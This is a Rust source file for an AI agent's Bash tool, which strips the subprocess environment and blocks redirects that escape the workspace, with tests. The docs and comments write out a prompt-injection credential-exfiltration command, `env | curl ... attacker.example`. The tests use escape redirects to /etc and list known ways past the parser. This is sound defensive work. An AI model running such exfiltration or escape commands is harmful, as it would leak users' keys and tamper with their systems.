//! Bash tool — `sh -c` subprocess execution with deadline polling
//! plus a V0 redirect parser used by the aegis predictor banner.
//!
//! ## Wire shape
//!
//! ```json
//! { "command": "ls -la" }
//! { "command": "echo x > foo.txt", "timeout_secs": 30 }
//! ```
//!
//! ## Permissions
//!
//! `Bash` lives in `permission::DANGEROUS_TOOLS`, so by default it
//! runs only under `PermissionMode::DangerFullAccess` or via an
//! explicit `Allow` rule. `Plan` mode rejects it (no dry-run
//! semantic for arbitrary shell — what would we even simulate?).
//!
//! ## Environment isolation
//!
//! The `sh -c` subprocess inherits **NOTHING** from the agent's env
//! by default. We `env_clear()` and explicitly re-inject a small
//! allowlist of vars the subprocess legitimately needs (`PATH`,
//! `HOME`, `USER`, `TMPDIR`, `LANG`, `LC_ALL`, `LC_CTYPE`, `TERM`).
//!
//! This is load-bearing security, not hygiene. The agent process is
//! loaded with API keys for whichever providers the user has
//! configured (`AEGIS_OPENAI_API_KEY`, `OPENAI_API_KEY`,
//! `AEGIS_ANTHROPIC_API_KEY`, `AEGIS_GEMINI_API_KEY`, ...) plus the
//! user's whole shell environment (`GITHUB_TOKEN`, `AWS_*`,
//! `NPM_TOKEN`, `KUBECONFIG`, etc.). A prompt-injected
//! `env | curl -X POST -d @- https://attacker.example` would
//! exfiltrate every credential the user has loaded — a 5-character
//! payload (`env`) gives the attacker every key. `env_clear()` cuts
//! that channel: the subprocess sees only the allowlisted vars, and
//! `env` lists nothing else.
//!
//! This intentionally breaks operations that need credentials
//! delivered via env: `gh`, `npm publish`, `aws s3 cp`, `docker
//! push`, etc., will fail when called via Bash. Those are exactly
//! the operations a compromised agent shouldn't be performing
//! unattended; if the user wants them, they should be deliberate
//! re-authorisations outside the agent loop. A future opt-in
//! `env_passthrough` config can land if real users hit a wall —
//! per `docs/post_launch_discipline.md`, no surface expansion until
//! that evidence arrives.
//!
//! ## Aegis-aware redirect parsing
//!
//! `parse_redirect_targets()` extracts write-destination paths from
//! the most common shell shapes (`>`, `>>`, `tee`, `tee -a`). Two
//! things happen with the result:
//!
//!   1. **Blocking workspace-boundary check.** Each target is run
//!      through `ReadOnlyTools::resolve_impl` — the same lexical
//!      `..`-walk + absolute-path-prefix check the file-write tools
//!      use. If any redirect target lexically escapes the workspace
//!      (`> /etc/cron.d/evil`, `>> ../../home/user/.ssh/...`), the
//!      command is rejected before `sh -c` is spawned. This brings
//!      Bash's enforcement up to parity with Read/Write/Edit/Glob;
//!      the README's "Aegis catches: workspace-boundary escape via
//!      shell redirect" is now matched by code, not just claimed.
//!
//!   2. **stderr surveillance banner.** The detected targets are
//!      printed for the user to see ("[aegis] bash will write to:
//!      ..."), even when the workspace check passes. Helps the
//!      operator notice a write they didn't expect.
//!
//! Documented limitations of the parser (a bypass walks past both
//! the banner AND the boundary check, so they are real):
//!   - quoted strings (`echo "a > b"`) — would over-match
//!   - heredocs (`<<EOF`) — not detected
//!   - subshells (`sh -c '...'`) — not recursed
//!   - exec redirects (`2>&1`) — skipped
//!   - no-space forms (`cmd>file`) — not detected
//!
//! Conservative bias: missed targets are silent (no false alarm,
//! no false block). The PostToolUse cost observer still runs —
//! anything that actually changed structural cost surfaces there
//! even when the parser missed the target. Defence in depth, not
//! fortress.

use std::path::PathBuf;
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};

use serde::Deserialize;
use serde_json::json;

use crate::agent_tools::ReadOnlyTools;
use crate::api::ToolDefinition;
use crate::tool::{ToolError, ToolExecutor};

const DEFAULT_TIMEOUT_SECS: u64 = 60;
const MAX_TIMEOUT_SECS: u64 = 600;
/// Max captured bytes per stream — enough for normal CLI output,
/// caps runaway loops. Truncation marker appended when exceeded.
const MAX_OUTPUT_BYTES: usize = 256 * 1024;

/// Variables the subprocess legitimately needs. Anything not in
/// this list is stripped via `env_clear()` to prevent credential
/// exfiltration via `env | curl ...` style prompt injection. See
/// the module docs for the threat model.
const ENV_PASSTHROUGH: &[&str] = &[
    "PATH",     // exec dispatch — without this, nothing runs
    "HOME",     // ~ expansion, ~/.gitconfig, ~/.cargo, etc.
    "USER",     // some tools query identity
    "TMPDIR",   // tempfile dispatch on macOS / BSD
    "LANG",     // locale
    "LC_ALL",
    "LC_CTYPE",
    "TERM",     // terminal-handling for non-tty tools that still check
];

#[derive(Debug, Deserialize)]
struct BashInput {
    command: String,
    #[serde(default)]
    timeout_secs: Option<u64>,
}

/// Standalone bash executor. Wrap into a `MultiToolExecutor` source
/// alongside `ReadOnlyTools` / `WorkspaceTools` when the agent
/// permits shell.
pub struct BashTool {
    workspace: PathBuf,
}

impl BashTool {
    #[must_use]
    pub fn new(workspace: impl Into<PathBuf>) -> Self {
        Self {
            workspace: workspace.into(),
        }
    }

    /// Single tool definition advertised to the LLM. Stable schema —
    /// the agent prompt references this name.
    #[must_use]
    pub fn definitions() -> Vec<ToolDefinition> {
        vec![ToolDefinition {
            name: "Bash".into(),
            description:
                "Run a shell command via /bin/sh -c in the workspace root. \
                 Captures stdout + stderr (truncated to 256 KiB each). \
                 Optional timeout_secs caps execution (default 60, max 600). \
                 Aegis logs any redirect targets (> / >> / tee) before run."
                    .into(),
            input_schema: json!({
                "type": "object",
                "properties": {
                    "command": { "type": "string" },
                    "timeout_secs": { "type": "integer", "minimum": 1, "maximum": MAX_TIMEOUT_SECS }
                },
                "required": ["command"]
            }),
        }]
    }

    fn run(&self, input: &str) -> Result<String, ToolError> {
        let parsed: BashInput = serde_json::from_str(input)
            .map_err(|e| ToolError::new(format!("Bash input not valid JSON: {e}")))?;

        let timeout = Duration::from_secs(
            parsed
                .timeout_secs
                .unwrap_or(DEFAULT_TIMEOUT_SECS)
                .min(MAX_TIMEOUT_SECS),
        );

        let targets = parse_redirect_targets(&parsed.command);
        if !targets.is_empty() {
            // Workspace-boundary check on detected targets. Same
            // lexical rule the file-write tools (Read / Write /
            // Edit / Glob) apply: absolute paths must live under
            // workspace; relative + workspace-rooted paths must
            // not escape via `..`. First escape rejects the whole
            // command — `sh -c` is never spawned. Limitations of
            // the parser (quoted strings, heredocs, no-space form)
            // are upstream; anything the parser misses bypasses
            // this check too, by design (see module docs).
            for target in &targets {
                ReadOnlyTools::resolve_impl(&self.workspace, target).map_err(|e| {
                    ToolError::new(format!(
                        "Bash redirect target rejected — {}",
                        e.message()
                    ))
                })?;
            }
            // All targets within bounds — surface them so the user
            // sees the planned mutation without needing --verbose.
            eprintln!(
                "[aegis] bash will write to: {}",
                targets.join(", ")
            );
        }

        let mut cmd = Command::new("sh");
        cmd.arg("-c")
            .arg(&parsed.command)
            .current_dir(&self.workspace)
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());

        // Strip parent env, re-inject only the allowlist. Without
        // this, a prompt-injected `env | curl ... attacker.com`
        // would exfiltrate every credential the agent process has
        // loaded (LLM provider API keys, GitHub / AWS / NPM tokens
        // from the user's shell, etc.). See module docs for full
        // threat model.
        cmd.env_clear();
        for var in ENV_PASSTHROUGH {
            if let Ok(value) = std::env::var(var) {
                cmd.env(var, value);
            }
        }

        let mut child = cmd
            .spawn()
            .map_err(|e| ToolError::new(format!("Bash spawn failed: {e}")))?;

        let deadline = Instant::now() + timeout;
        loop {
            match child.try_wait() {
                Ok(Some(_status)) => break,
                Ok(None) => {
                    if Instant::now() >= deadline {
                        let _ = child.kill();
                        let _ = child.wait();
                        return Err(ToolError::new(format!(
                            "Bash timed out after {}s: {}",
                            timeout.as_secs(),
                            short(&parsed.command)
                        )));
                    }
                    std::thread::sleep(Duration::from_millis(50));
                }
                Err(e) => {
                    let _ = child.kill();
                    let _ = child.wait();
                    return Err(ToolError::new(format!("Bash poll failed: {e}")));
                }
            }
        }

        let output = child
            .wait_with_output()
            .map_err(|e| ToolError::new(format!("Bash output capture failed: {e}")))?;

        let stdout = capture_with_cap(&output.stdout);
        let stderr = capture_with_cap(&output.stderr);
        let exit = output
            .status
            .code()
            .map(|c| c.to_string())
            .unwrap_or_else(|| "signal".to_string());

        Ok(format!(
            "exit_code: {exit}\n--- stdout ---\n{stdout}\n--- stderr ---\n{stderr}"
        ))
    }
}

impl ToolExecutor for BashTool {
    fn execute(&mut self, tool_name: &str, input: &str) -> Result<String, ToolError> {
        match tool_name {
            "Bash" | "bash" => self.run(input),
            other => Err(ToolError::new(format!(
                "BashTool received unknown tool name: {other:?}"
            ))),
        }
    }
}

fn capture_with_cap(bytes: &[u8]) -> String {
    if bytes.len() <= MAX_OUTPUT_BYTES {
        return String::from_utf8_lossy(bytes).into_owned();
    }
    let head = &bytes[..MAX_OUTPUT_BYTES];
    let truncated = bytes.len() - MAX_OUTPUT_BYTES;
    format!(
        "{}\n... [truncated {truncated} bytes]",
        String::from_utf8_lossy(head)
    )
}

fn short(cmd: &str) -> String {
    const MAX: usize = 80;
    if cmd.len() <= MAX {
        cmd.to_string()
    } else {
        format!("{}…", &cmd[..MAX])
    }
}

/// Extract write-destination paths from a shell command.
///
/// Recognised shapes (whitespace-tokenized):
///
///   - `cmd > path`
///   - `cmd >> path`
///   - `... | tee path`
///   - `... | tee -a path`
///
/// Returns paths in command order, deduplicated. Tokens that look
/// like flags (`-x`, `--long`) are skipped when looking for tee's
/// target.
#[must_use]
pub fn parse_redirect_targets(command: &str) -> Vec<String> {
    let tokens: Vec<&str> = command.split_whitespace().collect();
    let mut found: Vec<String> = Vec::new();
    let mut i = 0;
    while i < tokens.len() {
        let t = tokens[i];
        if t == ">" || t == ">>" {
            if let Some(target) = tokens.get(i + 1) {
                push_unique(&mut found, target);
                i += 2;
                continue;
            }
        } else if t == "tee" {
            // Skip flag tokens to find the path argument.
            let mut j = i + 1;
            while let Some(next) = tokens.get(j) {
                if next.starts_with('-') {
                    j += 1;
                    continue;
                }
                push_unique(&mut found, next);
                break;
            }
            i = j + 1;
            continue;
        }
        i += 1;
    }
    found
}

fn push_unique(out: &mut Vec<String>, s: &str) {
    let owned = s.to_string();
    if !out.contains(&owned) {
        out.push(owned);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;
    use tempfile::tempdir;

    #[test]
    fn parses_simple_redirect() {
        assert_eq!(
            parse_redirect_targets("echo hello > out.txt"),
            vec!["out.txt".to_string()]
        );
    }

    #[test]
    fn parses_append_redirect() {
        assert_eq!(
            parse_redirect_targets("echo more >> log.txt"),
            vec!["log.txt".to_string()]
        );
    }

    #[test]
    fn parses_tee_target() {
        assert_eq!(
            parse_redirect_targets("ls | tee files.txt"),
            vec!["files.txt".to_string()]
        );
    }

    #[test]
    fn parses_tee_a_skips_flag() {
        assert_eq!(
            parse_redirect_targets("date | tee -a daily.log"),
            vec!["daily.log".to_string()]
        );
    }

    #[test]
    fn parses_multiple_redirects_dedupes() {
        // Same target appearing twice (rare but possible) collapses.
        let r = parse_redirect_targets("echo a > out.txt && echo b >> out.txt");
        assert_eq!(r, vec!["out.txt".to_string()]);
    }

    #[test]
    fn no_redirect_returns_empty() {
        assert!(parse_redirect_targets("ls -la").is_empty());
        assert!(parse_redirect_targets("git status").is_empty());
    }

    #[test]
    fn missing_redirect_target_is_dropped_safely() {
        // Trailing `>` with no following token — nothing to emit.
        assert!(parse_redirect_targets("echo lost >").is_empty());
    }

    #[test]
    fn definitions_advertises_one_tool_named_bash() {
        let defs = BashTool::definitions();
        assert_eq!(defs.len(), 1);
        assert_eq!(defs[0].name, "Bash");
    }

    #[test]
    fn run_simple_command_returns_stdout_and_exit_zero() {
        let dir = tempdir().unwrap();
        let mut tool = BashTool::new(dir.path());
        let input = json!({ "command": "echo hello" }).to_string();
        let out = tool.execute("Bash", &input).unwrap();
        assert!(out.contains("exit_code: 0"));
        assert!(out.contains("hello"));
    }

    #[test]
    fn run_failing_command_captures_nonzero_exit() {
        let dir = tempdir().unwrap();
        let mut tool = BashTool::new(dir.path());
        let input = json!({ "command": "exit 7" }).to_string();
        let out = tool.execute("Bash", &input).unwrap();
        assert!(out.contains("exit_code: 7"));
    }

    #[test]
    fn timeout_kills_long_running_command() {
        let dir = tempdir().unwrap();
        let mut tool = BashTool::new(dir.path());
        let input = json!({ "command": "sleep 10", "timeout_secs": 1 }).to_string();
        let err = tool.execute("Bash", &input).unwrap_err();
        assert!(err.message().contains("timed out"));
    }

    #[test]
    fn run_runs_in_workspace_dir() {
        let dir = tempdir().unwrap();
        std::fs::write(dir.path().join("marker.txt"), "x").unwrap();
        let mut tool = BashTool::new(dir.path());
        let input = json!({ "command": "ls" }).to_string();
        let out = tool.execute("Bash", &input).unwrap();
        assert!(out.contains("marker.txt"));
    }

    #[test]
    fn unknown_tool_name_errors() {
        let dir = tempdir().unwrap();
        let mut tool = BashTool::new(dir.path());
        let err = tool
            .execute("NotBash", r#"{"command":"echo x"}"#)
            .unwrap_err();
        assert!(err.message().contains("unknown tool name"));
    }

    #[test]
    fn malformed_json_yields_helpful_error() {
        let dir = tempdir().unwrap();
        let mut tool = BashTool::new(dir.path());
        let err = tool.execute("Bash", "not json").unwrap_err();
        assert!(err.message().contains("not valid JSON"));
    }

    // ----------------------------------------------------------------
    // Workspace-boundary enforcement on redirect targets.
    //
    // These tests pin the rule that `parse_redirect_targets` is now
    // load-bearing for security, not just surveillance. If a future
    // refactor pulls the boundary check back out of run(), the README
    // claim "Aegis catches workspace-boundary escape via shell
    // redirect" stops being true and these tests fail loudly.
    // ----------------------------------------------------------------

    #[test]
    fn bash_blocks_redirect_to_absolute_path_outside_workspace() {
        let dir = tempdir().unwrap();
        let mut tool = BashTool::new(dir.path());
        // The redirect target is an absolute path well outside the
        // workspace. The boundary check must reject before `sh -c`
        // is spawned.
        let input = json!({
            "command": "echo malicious > /tmp/aegis_test_escape_target"
        })
        .to_string();
        let err = tool.execute("Bash", &input).unwrap_err();
        assert!(
            err.message().contains("redirect target rejected"),
            "expected redirect rejection, got: {}",
            err.message()
        );
        assert!(
            err.message().contains("absolute path outside workspace"),
            "expected absolute-path message, got: {}",
            err.message()
        );
        // The file must NOT have been created — a process never ran.
        assert!(
            !std::path::Path::new("/tmp/aegis_test_escape_target").exists(),
            "redirect target was created despite rejection"
        );
    }

    #[test]
    fn bash_blocks_redirect_with_parent_dir_traversal() {
        let dir = tempdir().unwrap();
        let mut tool = BashTool::new(dir.path());
        let input = json!({
            "command": "echo malicious >> ../../etc/aegis_traversal_test"
        })
        .to_string();
        let err = tool.execute("Bash", &input).unwrap_err();
        assert!(
            err.message().contains("redirect target rejected"),
            "expected redirect rejection, got: {}",
            err.message()
        );
        assert!(
            err.message().contains("escapes workspace root"),
            "expected escape message, got: {}",
            err.message()
        );
    }

    #[test]
    fn bash_blocks_tee_redirect_outside_workspace() {
        let dir = tempdir().unwrap();
        let mut tool = BashTool::new(dir.path());
        // tee form should be checked the same way as `>` / `>>`.
        let input = json!({
            "command": "echo malicious | tee -a /tmp/aegis_tee_escape_target"
        })
        .to_string();
        let err = tool.execute("Bash", &input).unwrap_err();
        assert!(
            err.message().contains("redirect target rejected"),
            "expected tee redirect rejection, got: {}",
            err.message()
        );
    }

    #[test]
    fn bash_allows_redirect_to_workspace_relative_path() {
        let dir = tempdir().unwrap();
        let mut tool = BashTool::new(dir.path());
        let input = json!({
            "command": "echo allowed > inside.txt"
        })
        .to_string();
        let out = tool.execute("Bash", &input).unwrap();
        assert!(out.contains("exit_code: 0"));
        assert!(dir.path().join("inside.txt").exists());
    }

    // ----------------------------------------------------------------
    // Environment isolation. Subprocess must NOT inherit credentials
    // from the agent process's env. See module docs for threat model.
    // ----------------------------------------------------------------

    #[test]
    fn bash_subprocess_does_not_inherit_parent_secrets() {
        // Unique marker name + value so this test is robust against
        // parallel test execution and any other env vars the
        // developer / CI happens to have set.
        const LEAK_KEY: &str = "AEGIS_BASH_LEAK_TEST_b9f2e3a4";
        const LEAK_VALUE: &str = "MUST_NOT_APPEAR_IN_SUBPROCESS_7c4d8f";

        // Set marker on parent — analogous to a real API key the
        // agent process would carry.
        std::env::set_var(LEAK_KEY, LEAK_VALUE);

        let dir = tempdir().unwrap();
        let mut tool = BashTool::new(dir.path());
        // The subprocess dumps its full env. If env_clear() is
        // working, neither name nor value should be present.
        let input = json!({ "command": "env" }).to_string();
        let out = tool.execute("Bash", &input).unwrap();

        std::env::remove_var(LEAK_KEY);

        assert!(
            !out.contains(LEAK_KEY),
            "leak key {LEAK_KEY} appeared in subprocess env: {out}"
        );
        assert!(
            !out.contains(LEAK_VALUE),
            "leak VALUE {LEAK_VALUE} appeared in subprocess env: {out}"
        );
    }

    #[test]
    fn bash_subprocess_does_not_inherit_simulated_api_keys() {
        // Same shape as the real attack vector: simulate the agent
        // process having a provider API key in env, then run a
        // command that would exfiltrate it.
        const FAKE_OPENAI_KEY: &str = "sk-fake-test-key-leak-canary-3a8f1d";
        std::env::set_var("AEGIS_OPENAI_API_KEY_TEST_LEAK", FAKE_OPENAI_KEY);

        let dir = tempdir().unwrap();
        let mut tool = BashTool::new(dir.path());
        // The classic exfil pattern (without actually curling).
        let input = json!({
            "command": "env | grep -i api_key || echo CLEAN"
        })
        .to_string();
        let out = tool.execute("Bash", &input).unwrap();

        std::env::remove_var("AEGIS_OPENAI_API_KEY_TEST_LEAK");

        assert!(
            !out.contains(FAKE_OPENAI_KEY),
            "API key value leaked via subprocess env: {out}"
        );
        // The grep should have found nothing → CLEAN printed.
        assert!(
            out.contains("CLEAN"),
            "expected `env | grep api_key` to find nothing, got: {out}"
        );
    }

    /// Bash uses `ReadOnlyTools::resolve_impl` for its redirect-
    /// target check, so the V7 symlink defense added there flows
    /// through automatically. This test pins that integration:
    /// a redirect into an in-workspace symlink that points outside
    /// the workspace must still reject.
    #[cfg(unix)]
    #[test]
    fn bash_blocks_redirect_through_symlink_to_outside_workspace() {
        use std::os::unix::fs::symlink;
        let dir = tempdir().unwrap();
        // Plant escape -> /etc inside the workspace. Lexically the
        // redirect target `escape/cron.d/evil` is under workspace;
        // only the canonicalize check catches the symlink.
        symlink("/etc", dir.path().join("escape")).unwrap();

        let mut tool = BashTool::new(dir.path());
        let input = json!({
            "command": "echo malicious > escape/cron.d/aegis_symlink_test"
        })
        .to_string();
        let err = tool.execute("Bash", &input).unwrap_err();
        assert!(
            err.message().contains("redirect target rejected"),
            "expected rejection, got: {}",
            err.message()
        );
        assert!(
            err.message().contains("resolves outside workspace"),
            "expected symlink-resolve message, got: {}",
            err.message()
        );
    }

    #[test]
    fn bash_subprocess_keeps_path_so_basic_commands_still_run() {
        // PATH is on the allowlist — `ls` must still resolve.
        // If env stripping was over-aggressive (e.g. dropping PATH)
        // this test catches the regression.
        let dir = tempdir().unwrap();
        std::fs::write(dir.path().join("hello.txt"), "hi").unwrap();
        let mut tool = BashTool::new(dir.path());
        let input = json!({ "command": "ls" }).to_string();
        let out = tool.execute("Bash", &input).unwrap();
        assert!(out.contains("exit_code: 0"), "ls failed: {out}");
        assert!(out.contains("hello.txt"));
    }

    #[test]
    fn bash_allows_redirect_to_absolute_path_inside_workspace() {
        let dir = tempdir().unwrap();
        let target = dir.path().join("nested.txt");
        let mut tool = BashTool::new(dir.path());
        // Absolute path that lives under the workspace root must
        // still pass — boundary rejects only when path is OUTSIDE
        // the workspace.
        let input = json!({
            "command": format!("echo allowed > {}", target.display())
        })
        .to_string();
        let out = tool.execute("Bash", &input).unwrap();
        assert!(out.contains("exit_code: 0"));
        assert!(target.exists());
    }
}
